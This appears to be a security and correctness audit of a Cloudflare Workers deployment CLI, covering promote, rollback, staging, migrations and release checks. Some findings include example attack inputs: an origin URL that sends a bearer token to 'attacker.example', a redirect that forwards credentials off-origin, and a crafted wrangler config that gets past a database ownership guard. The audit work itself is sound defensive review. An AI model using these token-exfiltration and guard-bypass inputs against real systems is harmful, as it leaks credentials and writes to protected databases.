# Ponytail audit: `packages/tooling/narduk-app-tools/src`

Audit spec: ponytail-audit v5.3.2, estate-adapted. Read-only. No source file was changed.

What this repo does: narduk-libs publishes the shared packages the fleet installs. This package is the `narduk-app` CLI those Nuxt apps run on a laptop or in GitHub Actions. It covers local dev, D1 migrations, Wrangler upload, promote, rollback, ship, live proof, and the foundation checks that gate a release.

Load I assumed: one process per command. Promote and ship move one Worker’s production traffic, and two jobs can do that in the same minute. Branch builds upload a version often, so a Worker can hold hundreds of versions. Migrations are small SQL files against one D1 database. This is not a high-QPS server.

I traced deploy, promote, rollback, ship, staging, the migration runner, the ownership guard, agent-key create, adoption publish, the egress retry, verify-live’s origin check, and the foundation scanners cited below. 20 findings. 12 smaller ones are listed at the end and were not written up.

## Must fix

### 1. Promote skips the rollback guards when it cannot see one live version

`packages/tooling/narduk-app-tools/src/promote.ts:1750-1924`

What this is: `versions-promote` refuses an older commit, and it refuses a commit that would undo a ship. Both checks need the version that is live right now.

Problem: `previousVersionId` is set only when the newest deployment is one version at 100% (`promote.ts:1629-1630`). `liveVersion` is that id looked up in the version list (`promote.ts:1750-1753`). The ship guard, the git ancestry check, and the ordering guard all require `liveVersion` (`promote.ts:1818-1924`). If it is missing, the command still deploys at `promote.ts:2004-2014` and exits 0.

Two cases:

- Traffic is split, for example `v-canary` at 10% and `v-good` at 90%. `soleDeployedVersionId` is null. A later job for an older SHA that is still in the list deploys that older version at 100%. Outcome is `promoted`.
- Production serves `v-live`, but more than `maxVersions` newer uploads (default 500) push it out of the list. The deployment list still names `v-live`. The version list does not, so `liveVersion` is null. A rebuild of an older SHA sits inside the window. The comment at `promote.ts:1853-1855` says the ordering guard should decide when the live version is not in the list. The `liveVersion &&` test skips that guard too.

`tests/promote.test.ts` checks that a split id is null. It does not run a promote against a split deployment or a live id missing from `listVersions`.

Fix: If the newest deployment exists and is not one version at 100%, or that version id is not in the listing, return `stale-promote` unless `--force`. An empty deployment list can stay allowed.

If we skip it: A late job rolls production back and exits 0. Its own live proof passes, because that older SHA really is what is serving.

### 2. A failed ship proof rolls back to the version from the start of the command

`packages/tooling/narduk-app-tools/src/ship.ts:601-627`

What this is: After ship puts its version at 100%, it proves the live URL. On failure it puts the previous version back.

Problem: `previousVersionId` is captured before the build (`ship.ts:485-486`). The proof then polls for the manifest’s attempts and interval (default 6 times, 10 seconds apart). On failure, rollback deploys that saved id (`ship.ts:623-627`). It does not read what is live now.

Case: Ship has promoted `Vship` over `V1`. During the proof, the main promote job deploys `Vmain`. The proof fails `expect-sha`. Ship deploys `V1` at 100%. `Vmain` is gone. The command reports a successful rollback.

`readDeployment` does refuse split traffic and a tied timestamp before the promote (`ship-support.ts:209-219`). That check does not run again before this rollback.

Fix: On proof failure, read the live version again. Roll back only when it is still the version this ship just deployed. If it is anything else, exit `rollbackFailed` and do not deploy.

If we skip it: A ship whose proof fails while CI promotes main puts production back on the pre-ship version.

### 3. A staging version that failed its proof still unlocks production

`packages/tooling/narduk-app-tools/src/promote.ts:1513-1534`

What this is: With staging enabled, production promote is supposed to follow a green staging proof of the same commit.

Problem: `checkStagingServesSha` returns success when the only 100% staging version is tagged with the SHA. It does not record that the proof passed. Rollback runs only when `previousVersionId` is set and the deploy works (`staging.ts:611-617`).

Case: The first staging deploy has no previous version. The proof returns FAIL. Nothing is rolled back. The command exits 4, so the same shell chain stops. The unproven version stays at 100% with the commit tag. The next `versions-promote` for that SHA sees the tag and deploys it to production. The same thing happens when a later rollback throws: `staging.ts:615-617` logs the failure and still leaves the bad version at 100%.

`--force` does not bypass this gate. `NARDUK_ALLOW_MANUAL_PROMOTE=1` skips the gate entirely (`promote.ts:1961-1963`).

Fix: A failed proof must not leave that version at 100%. If there is no previous version, or the rollback deploy throws, take it off 100% before returning. The production gate should treat a matching tag as not enough unless the live deployment message is a successful staging deploy.

If we skip it: A broken first staging build becomes a green signal for the next production promote.

### 4. Derived staging config keeps cross-script Durable Object bindings

`packages/tooling/narduk-app-tools/src/staging.ts:246-266`

What this is: Without `staging.wranglerConfig`, staging clones the production Worker config, rebinds D1, KV, and R2, and renames the Worker.

Problem: The blocks that must not be copied are `hyperdrive`, `vectorize`, `analytics_engine_datasets`, `services`, and `queues` (`staging.ts:83-88` and `staging.ts:249-258`). `durable_objects` is an object `{ bindings: [...] }`, so it is not in that list, and the array check would miss it anyway. `planPreviewConfig` clones the whole config and only edits D1, KV, and R2 (`preview-config.ts:156-169`).

Case: Production has

```json
"durable_objects": {
  "bindings": [{ "name": "ROOM", "class_name": "Room", "script_name": "prod-worker" }]
}
```

and no `staging.wranglerConfig`. The derived config keeps `script_name: prod-worker`. Staging calls the production Worker’s Durable Object.

A binding with no `script_name` stays on the staging script. This case is the cross-script one.

Fix: Treat `durable_objects.bindings` that set `script_name` like `services`. Throw and require `staging.wranglerConfig`.

If we skip it: Staging traffic writes production Durable Object state.

### 5. `db migrate` does not check the database id it is about to open

`packages/tooling/narduk-app-tools/src/migrations.ts:896-904`

What this is: The migration runner must not write a contract-owned D1 database. `assertMigrationRunnerOwnership` refuses the binding name, the database name, and `options.databaseId` (`database-ownership.ts:505-528`). The comment at `database-ownership.ts:481-483` says the id check closes the hole where another wrangler file points a different binding at the contract database.

Problem: `migrationDatabase` passes `options.target?.databaseId` only. `narduk-app db migrate` and `db status` never set `target` (`cli.ts:429-450`). The id check does not run. The command then adds `--config` from `--wrangler-config` (`migrations.ts:908-910`). Ownership reads the checkout’s own wrangler file (`database-ownership.ts:326-355`), not that flag.

Case: `READ_MODEL` is contract-owned with `database_id` `e1c9a190-7e04-4fb7-a2ed-d82d26bf50a1`. This command is allowed:

`narduk-app db migrate --config migrations.sources.json --database APP_DB --wrangler-config ./evil.json --remote`

`evil.json` has binding `APP_DB`, database name `app`, and that contract `database_id`. The guard sees the name `APP_DB`, not the id Wrangler will open. Migrations run on the contract database.

`db migrate-deployment` and `db baseline` do pass `target.databaseId`. Plain `db migrate` does not. The ownership tests cover an explicit `target.databaseId`. They do not cover this flag.

Fix: In `migrationDatabase`, resolve `database_id` from the wrangler config about to be passed (match binding, then `database_name`) and pass that id into the guard.

If we skip it: A supported flag writes SQL into a database the ownership rule says the runner must never open.

## Should fix

### 6. Promote picks a live version when the strict reader refuses

`packages/tooling/narduk-app-tools/src/worker-deployment.ts:25-38`

What this is: `currentDeployment` chooses the row promote and rollback treat as live. `resolveActiveWorkerVersion` is the strict reader. The file comment at `worker-deployment.ts:21-23` says the two cannot disagree.

Problem: On equal `created_on`, the sort is stable and the last tied row wins (`worker-deployment.ts:29-31`). `resolveActiveWorkerVersion` returns `ambiguous` when those rows do not share one 100% version (`worker-deployment.ts:67-71`). Ship already throws on that tie (`ship-support.ts:217-218`). Promote does not.

Case: Newest-first, same timestamp, `[d-new → v-new @ 100%, d-old → v-old @ 100%]`. Promote treats `v-old` as live. A version whose number sits between them passes the ordering guard and is deployed at 100%. Unnamed rollback walks from that same row (`promote.ts:1042-1056`).

A second case: every row has no `created_on`. The strict reader returns `undated`. `currentDeployment` still returns the last row. If the list is newest-first, that last row is the oldest deployment, and the ordering guard compares against the wrong version.

Fix: Promote and rollback should use `resolveActiveWorkerVersion` and refuse on `ambiguous`, `split`, or `undated`.

If we skip it: A tie this code already treats as untrustworthy for config reads becomes a production rollback.

### 7. Rollback does not apply the event guard promote uses

`packages/tooling/narduk-app-tools/src/promote.ts:2061-2068`

What this is: Promote refuses a `pull_request` or `pull_request_target` run, and any event outside `PROMOTE_EVENTS` (`promote.ts:273-302`, called at `promote.ts:1581-1583`).

Problem: `runRollback` checks `isActionsPromoteAllowed` only. That is true for any Actions run with `CI`, `GITHUB_ACTIONS`, `GITHUB_RUN_ID`, `GITHUB_REPOSITORY`, and `GITHUB_WORKFLOW`.

Case: Those variables are set, `GITHUB_EVENT_NAME=pull_request`, and `CLOUDFLARE_API_TOKEN` is present. `runVersionsPromote` returns `guard-refused` and does not deploy. `runRollback` lists deployments and runs `wrangler rollback`.

Fix: Unless `NARDUK_ALLOW_MANUAL_PROMOTE` is set, run the same event check at the start of `runRollback` and return `guard-refused`.

If we skip it: A pull request job that holds the promote token can move production traffic. Promote is written to refuse that event.

### 8. A bad app config turns the staging gate off

`packages/tooling/narduk-app-tools/src/promote.ts:1543-1554`

What this is: `readEnabledStaging` decides whether production must wait for staging. The comment says a missing declaration should behave as it always has.

Problem: The `catch` returns null for every throw. Promote does not prime app config (`cli.ts:473-487`). Upload does (`cli.ts:497`).

Case: `Config/cloudflare-app.json` is invalid JSONC, or the mode is portal and `primeAppConfig` was not called. `readAppConfigSync` throws `not-resolved` (`app-config/resolve.ts:696-701`). The catch returns null. `staging.enabled: true` is never read. Promote continues with no staging check.

Fix: Return null only when the block is absent or staging is disabled. A throw should be `guard-refused` or `staging-not-proven`. Prime `cloudflare-app.json` on the promote path the same way upload does.

If we skip it: A portal-only app, or a commit that breaks that JSON, promotes to production with the staging gate removed.

### 9. The staging gate looks at 20 versions and calls a missing row untagged

`packages/tooling/narduk-app-tools/src/promote.ts:1525-1531`

What this is: The gate loads the live staging version and reads its commit tag.

Problem: It calls `listVersions(20)`. Without an API token, `createWranglerCli` ignores that limit and returns wrangler’s 10 (`promote.ts:714-724`, `WRANGLER_VERSION_LIST_CAP` at `promote.ts:164`). If the live id is not in those rows, `tag` is undefined. The refusal says the live version has no commit tag.

Case: Staging still serves `v-good` tagged with the SHA. Twenty later uploads were rolled back after failed proofs, so they are newer. `listVersions(20)` does not contain `v-good`. Production promote exits 11. The usual escape is `NARDUK_ALLOW_MANUAL_PROMOTE=1`, which also skips the gate in finding 3.

Fix: Page until that deployment’s version id is found, or the listing is complete. Do not describe a missing row as an untagged version.

If we skip it: A staging Worker with a long failed-upload history blocks a commit it is actually serving, and the override that unblocks it also disables the gate.

### 10. A caller `--message` can label a preview upload as `main`

`packages/tooling/narduk-app-tools/src/deploy.ts:202-214`

What this is: A non-production Workers Build uploads preview D1, KV, and R2 when `deployment.previewBindings` is complete (`deploy.ts:344-401`). Promote then trusts `workers/message` to decide the branch (`promote.ts:984-994`).

Problem: `resolveVersionTagArgs` writes `Workers Builds <branch> @ <sha12>` only when the caller did not pass `--message`. `versionBranch` reads that message and does not compare the hex after ` @ ` to `workers/tag`. `SHA_PATTERN` accepts any 7 to 64 hex digits (`promote.ts:228`).

Case: A Workers Build of commit `abc…` (full SHA) with `WORKERS_CI_BRANCH=feature` runs `narduk-app deploy versions-upload --message "Workers Builds main @ deadbeef1234"`. The tag is still `abc…`. The upload uses the preview config. Main later points at that same SHA, and no second version was uploaded. Promote finds one version, `versionBranch` returns `main`, and `deployVersion` puts the preview-bound version at 100%.

Checking that the message SHA is a prefix of the tag is not enough. The caller can put the real SHA’s first 12 hex digits in the message and still name branch `main`.

Fix: Inside a Workers Build, always set the branch message from `WORKERS_CI_BRANCH`. Refuse a caller `--message` on that path. Do not let the message name a different branch than the build environment.

If we skip it: The version promoted to production can be the feature-branch upload, including its preview D1, KV, and R2.

### 11. Migration filenames sort as strings, so `10000` runs before `9999`

`packages/tooling/narduk-app-tools/src/migrations.ts:589-591`

What this is: Discovery accepts a numeric prefix of four or more digits (`MIGRATION_FILENAME` at `migrations.ts:575`) and sorts with `localeCompare`.

Problem: That sort is not numeric. Checked order for `00010_alter.sql`, `0002_a.sql`, `0009_add.sql`, `9999_create.sql`, `10000_index.sql` is `00010`, `0002`, `0009`, `10000`, `9999`.

Case: The ledger already has `app:9999_create.sql`. Adding `10000_index.sql` plans apply `10000`, then skip `9999`. Strict mode is the default. That throws `Migration history has a gap before app:9999_create.sql`. The new migration cannot ship. On an empty database the same order runs `10000` before `9999`, so an index or alter runs before the table exists.

Four-digit zero-padded names from `0001` to `9999` still sort correctly. The break is the 5th digit, which the filename rule allows.

Fix: Sort with `localeCompare` and `{ numeric: true }`.

If we skip it: The first migration past `9999` either refuses to ship or runs out of order.

### 12. A source this runner accepts wedges the ledger on the next run

`packages/tooling/narduk-app-tools/src/migrations.ts:608-616`

What this is: `assertStableSource` decides which source names may be configured (`migrations.ts:336-350`). `isStableLedgerRow` decides which ledger rows this runner owns.

Problem: The writer allows any name that is not a path, `bundle:`, `layer:`, or `*.sql`. The reader only treats `app`, `app:…`, `package:…`, and `@…` as stable.

Case: `migrations.sources.json` has `"source": "auth"`. The first `db migrate` applies `0001.sql` and inserts `_narduk_migrations.source = 'auth'`. The second run does not see a stable row, finds no adoption, and throws `Ambiguous legacy migration row refused: auth:0001.sql`. Further migrations cannot run. Strict mode does not help. The row is classified as legacy before that check (`migrations.ts:718-723`).

Fix: One predicate. `assertStableSource` should reject a source `isStableLedgerRow` would not keep. A ledger row whose source is one of the configured migration sources should stay stable, so a database already applied under that name skips. Do not treat the literal source `wrangler` as configured. Those rows come from `d1_migrations` and have no checksum.

If we skip it: The first successful migrate with a custom source name makes every later migrate fail.

### 13. The first statement inside a trigger is invisible to the expand-only check

`packages/tooling/narduk-app-tools/src/migration-compatibility.ts:149-168`

What this is: `findDestructiveStatements` flags `DROP TABLE`, `DROP VIEW`, and `ALTER TABLE` … `DROP` / `RENAME` so an expand-only migration cannot destroy a table the old Worker still uses.

Problem: `splitStatements` breaks only on `;` (`migration-compatibility.ts:101-112`). The classifier then matches the start of each piece.

Case:

```sql
CREATE TRIGGER trg AFTER DELETE ON users BEGIN
  DROP TABLE sessions;
END;
```

The first piece is `CREATE TRIGGER … BEGIN DROP TABLE sessions`. It does not start with `DROP` or `ALTER`, so the result is `[]`. The same happens for a first-body `ALTER TABLE users DROP COLUMN email` and `ALTER TABLE users RENAME TO people`. A statement after an earlier semicolon inside the body is flagged. Only the statement glued to `BEGIN` is missed. After deploy, `DELETE FROM users` drops `sessions` under the old Worker.

Fix: On a piece that matches `CREATE TRIGGER … BEGIN`, run the same classifier on the text after `BEGIN`.

If we skip it: A reviewed migration can pass the destructive-statement check and still drop or rename a live table from a trigger.

### 14. Adoption publish sends the portal token to whatever host is in the origin string

`packages/tooling/narduk-app-tools/src/commands/adoption-publish.ts:157-170`

What this is: The command reads `OPERATOR_PORTAL_ADOPTION_INGEST_TOKEN` from the environment and posts the report with `Authorization: Bearer`.

Problem: The origin is trimmed and slash-stripped, then concatenated. It is never parsed. `fetch` is called with that URL.

Case: `--origin https://ops.nardukenterprises.com@attacker.example` (or `OPERATOR_PORTAL_URL` set to that). The request URL is `https://ops.nardukenterprises.com@attacker.example/api/estate/ingest`. The host is `attacker.example`. The bearer token is sent there. HTTP 200 is logged as stored. `--origin http://169.254.169.254` sends the same token in cleartext to that address.

Fix: Parse the origin with `new URL`. Require `https`. Allow `http` only for `localhost` and `127.0.0.1`. Reject a username or password. Request `url.origin` only. Set `redirect: 'error'`.

If we skip it: A bad origin flag or env var gives the ingest token to another host. That token is what the command is written to keep off argv.

### 15. The fetch-level egress retry forwards caller credentials across a cross-origin redirect

`packages/tooling/narduk-app-tools/src/egress-fallback.ts:386-388`

What this is: `createChallengeFallbackFetch` retries a Cloudflare challenge through the residential proxy. It is the public `./egress` export apps use for their own post-deploy check. The probe wrapper already uses `createLiveProbe`, which refuses a cross-origin redirect when the request has headers (`live-probe.ts:150-176`).

Problem: The fetch wrapper calls `transport(url, init)` with the original `init`. `createNodeFetch` follows redirects and keeps that same `init`, including `Authorization` (`live-dns.ts:220-228`). It does not drop the header when the host changes.

Case: `fetch('https://app.example/api/health', { headers: { authorization: 'Bearer prod-token' } })`. The direct answer is 403 with `cf-mitigated: challenge`. The proxy answer is `302 Location: https://attacker.example/collect`. The retry sends `Authorization: Bearer prod-token` to `attacker.example`. Native `fetch` strips that header on a cross-origin redirect. The fallback returns the attacker’s response and records `route: 'residential'`.

Fix: Send the retry through `createLiveProbe({}, transport)`, the same path the probe wrapper already uses.

If we skip it: A challenged request that redirects off-origin takes the caller’s bearer token with it.

### 16. `stripComments` deletes real code after `/*` inside a string

`packages/tooling/narduk-app-tools/src/foundation/strip-comments.ts:11-16`

What this is: Item 14 and item 15 scan handler source with comments removed, so a commented-out call does not count (`item-14-list-routes-use-contract.ts:59`, `item-15-public-reads-cached.ts:298`).

Problem: The scanner has no string state. `/*` inside a string starts a block comment. With no later `*/`, the rest of the file is discarded. A `//` inside a string does the same to the rest of that line. `https://` is spared only because the character before `//` is `:`.

Case: `server/api/stations.get.ts` contains

```ts
const pattern = 'server/**/*.ts'
export default defineEventHandler((event) => {
  const query = getQuery(event)
  const limit = query.limit
  return useDatabase(event).prepare('select * from t').all()
})
```

Item 14 no longer sees `getQuery` or `limit`, so 14.1 is `pass` (“no list routes”). Item 15 records no advisory. The D1 read is gone.

Fix: Track quotes and template literals, including escapes, and do not look for comments inside them.

If we skip it: A handler that mentions a glob, or any other `/*` in a string, can pass the list-route check and skip the public-read cache warning.

### 17. An absolute smoke or health path proves a different host

`packages/tooling/narduk-app-tools/src/verify-live.ts:868-874`

What this is: `verify --live` is the proof that decides whether a deploy stays up. `assessOrigin` fails the run when a redirect leaves the origin (`verify-live.ts:748-749`).

Problem: `assessOrigin` returns null unless `response.redirected` is set. `new URL('https://good.example/api/health', 'https://broken.example')` is already `https://good.example/api/health`, so fetch never redirects. `parseVerifyArgs` accepts that path. The deployment schema rejects it. This parser does not.

Case: `verify --live https://broken.example --expect-sha <sha that good.example already serves> --health-path https://good.example/api/health --smoke-path https://good.example/`. Both probes hit the other host. No origin assertion is recorded. The report is `PASS`, exit 0. A protocol-relative path `//good.example/` does the same.

Fix: After resolving each path, fail `origin` when the resolved URL’s origin is not the base URL’s origin.

If we skip it: A proof can go green against a host that was not deployed, and ship or promote will keep that traffic.

### 18. Single-quoted wrangler.toml bindings make the preview-data check pass

`packages/tooling/narduk-app-tools/src/foundation/items/item-12-deployment-standard.ts:188-189`

What this is: Item 12.4 fails a branch build that would bind production D1, KV, or R2. The TOML reader is there because the estate’s personal-account Workers are TOML (`item-12-deployment-standard.ts:207-211`).

Problem: `binding = 'PROD_DB'` does not match `binding\s*=\s*"..."`. With `nonProductionBranchBuilds: true` and only single-quoted bindings, the production list is empty. 12.4 returns `pass` at `item-12-deployment-standard.ts:969-977` (“no D1, KV or R2 binding”) before any preview check. A branch upload still binds production.

The same quote rule hides `account_id`. This file:

```toml
account_id = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
[env.personal]
account_id = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'
```

with `deployment.accountId` equal to the first id makes 12.5 `pass` (`item-12-deployment-standard.ts:1089-1098`). The personal account is never read. `manifests-validate.ts` already accepts either quote.

Fix: Use that scalar scanner, or accept `'` as well as `"`. Do not take the empty-binding pass until the file has actually been parsed.

If we skip it: The check that exists to stop a branch build writing production data passes for a single-quoted TOML file, and a second Cloudflare account stays invisible to 12.5.

## Nice to have

### 19. After one client-abort block, later `workerd@` lines are dropped

`packages/tooling/narduk-app-tools/src/e2e-serve/filter-workerd-client-abort.ts:111-114`

What this is: e2e-serve hides workerd’s client-abort stack so Playwright’s log stays readable. The README says a following `ECONNREFUSED` is the real crash and must still print.

Problem: Once the abort stack matches, `phase` stays `'complete'`. Every later blank line, `/^\s*stack:/` line, or line containing `workerd@` is discarded (`filter-workerd-client-abort.ts:88-95`).

Case: This stream prints nothing:

```text
[WebServer] ✘ [ERROR] kj::getCaughtExceptionAsKj() = kj/async-io-unix.c++:186: disconnected: ::write(fd, buffer.begin(), buffer.size()): Broken pipe
  stack: /app/node_modules/@cloudflare/workerd-linux-64/bin/workerd@586691a
✘ [ERROR] workerd@586691a exited: ECONNREFUSED 127.0.0.1:8787
```

A later `✘ [ERROR] connect ECONNREFUSED 127.0.0.1:8787` with no `workerd@` is kept.

Fix: In `'complete'`, if the line contains `[ERROR]` or is not a blank or workerd stack continuation, set `phase` back to `'idle'` and emit it.

If we skip it: The crash the filter was written to keep can vanish from the Playwright log after one aborted client.

### 20. A proof network error hides a key that is already in D1

`packages/tooling/narduk-app-tools/src/auth-agent-key.ts:420-422`

What this is: `auth agent-key create` writes the raw key to the sink, then inserts the user and the key hash, then proves the key against `--app-url`.

Problem: A status mismatch throws “The key was created but its proof failed” (`auth-agent-key.ts:365-370`). A `fetch` rejection does not. The CLI prints `error.message` (`cli.ts:607-608`), which for a failed DNS lookup is `fetch failed`, and exits 1.

Case: `--remote --app-url https://app.example` when DNS fails. D1 has the user and the hash. The sink has the raw `nk_` key. The output does not say the key is live. A retry mints a second one. With `--admin`, both are admin keys.

Fix: Catch a proof throw and use the same “key was created but its proof failed” error, with the cause name.

If we skip it: The operator retries, and the app gains a second live key it was not told about.

## Smaller items left out

12 smaller ones, each with a concrete input, not written up above:

- Item 10.4 passes `frame-ancestors *` and any non-empty `X-Frame-Options` (`item-10-security-headers.ts:226-238`).
- Item 10.2 reads `script-src` only, so `script-src 'nonce-abc'; script-src-elem 'unsafe-inline'` passes (`item-10-security-headers.ts:81-84`).
- Item 10.3 treats `Strict-Transport-Security: max-age="15552000"` as six months. A quoted value is not a valid directive (`item-10-security-headers.ts:90-93`).
- Item 10.5 and 10.6 pass any non-empty `referrer-policy` and `permissions-policy`, including `unsafe-url` and `camera=*` (`item-10-security-headers.ts:247-255`).
- Item 12.7’s `specFloor` is not end-anchored, so `2.10.1-rc.1` counts as `2.10.1` (`item-12-deployment-standard.ts:464-467`).
- In one `package.json`, `allDeps` lets `devDependencies` replace `dependencies`, so item 12.7 can pass on `2.10.1` while the app dependency is `2.2.3` (`source.ts:196-212`, `item-12-deployment-standard.ts:691`).
- A single-quoted placeholder `database_id = '00000000-0000-0000-0000-000000000000'` is invisible to item 1.5 (`d1-placeholder.ts:69-74`).
- Item 15 treats `Cache-Control: public, no-store` and `s-maxage=0` as a public cache, and a `withWorkerCache(` mention inside a string as a cache (`item-15-public-reads-cached.ts:179-197`).
- `normalizeContent` strips trailing spaces only. The comment says a re-indented file still matches. A leading indent changes the hash, so item 4.2 misses that fork (`content-hash.ts:11-20`).
- `verify` and the security-header probe read `response.arrayBuffer()` before applying `maxBodyBytes`, so a huge body is allocated in full (`live-probe.ts:182-196`).
- `doctor`’s `pnpm exec wrangler` spawn has no `cwd`, so a generated app whose Wrangler lives in `apps/web` is warned from the repo root (`doctor.ts:91-98`).
- `performance.ts` counts fonts only under `.output/public/_fonts/`, ignores `.svg`, and `walkFiles` follows a symlink with no visited set (`performance.ts:62-71` and `126-130`).

`compareVersions` compares prerelease identifiers as strings and says so (`evaluate-package-currency.ts:160-166`). I treated that as a decision. It is wrong for `rc.10` versus `rc.2` only when `dist-tags.latest` itself is a prerelease, which that comment says it does not handle.

Verdict: Do not trust promote, ship, or the staging gate until findings 1–3 are fixed. Finding 5 can write a contract-owned database through a flag the guard claims to cover. Finding 4 lets staging write a production Durable Object on the default derived config.

Lean: -20 lines, -0 dependencies possible. Promote and rollback should call `resolveActiveWorkerVersion` and drop the second sort in `currentDeployment`.

Not checked: `brand/` image rendering, `social/` image generation beyond the CLI wiring, `foundation/evaluate-adoption.ts`, `foundation/evaluate-nac-status.ts`, `app-config/resolve.ts` retry and backoff, foundation items 1–9 except where a scanner above calls them, the test suite as a suite, and Wrangler’s own handling of a binding `remote: true` or of a database argument that is a bare UUID. Those last two sit outside this `src` tree. I did not run the package tests or a build.
